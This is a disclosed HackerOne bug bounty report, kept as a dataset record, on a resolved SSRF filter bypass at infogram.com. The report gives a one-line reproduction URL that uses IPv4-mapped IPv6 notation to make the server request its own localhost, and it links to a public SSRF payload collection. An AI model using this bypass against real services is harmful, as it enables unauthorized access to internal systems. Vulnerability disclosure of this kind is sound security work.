---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '642675'
original_report_id: '642675'
title: 'Bypass for blind SSRF #281950 and #287496'
weakness: Server-Side Request Forgery (SSRF)
team_handle: infogram
created_at: '2019-07-14T01:27:49.354Z'
disclosed_at: '2020-05-24T14:18:34.617Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 24
asset_identifier: infogram.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# Bypass for blind SSRF #281950 and #287496

## Metadata

- HackerOne Report ID: 642675
- Weakness: Server-Side Request Forgery (SSRF)
- Program: infogram
- Disclosed At: 2020-05-24T14:18:34.617Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello, 
when checking these 2 reports #281950 and #287496 i found that it can be bypassed using IPv6/IPv4 Address Embedding

Steps to reproduce:
1-access this link https://infogram.com/api/web_resource/url?q=http://[0:0:0:0:0:ffff:127.0.0.1]

POC:
{F528736}

Refrences:
http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

## Impact

Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
